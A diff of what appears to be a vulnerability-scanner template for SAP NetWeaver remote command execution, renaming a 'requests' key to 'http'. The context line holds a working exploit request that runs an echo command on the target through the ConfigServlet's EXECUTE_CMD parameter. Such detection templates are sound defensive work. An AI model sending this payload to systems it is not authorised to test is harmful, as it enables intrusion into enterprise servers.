@@ -6,7 +6,7 @@ info:
   severity: high
   tags: NetWeaver,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=echo%2021232f297a57a5a743894a0e4a801fc3"
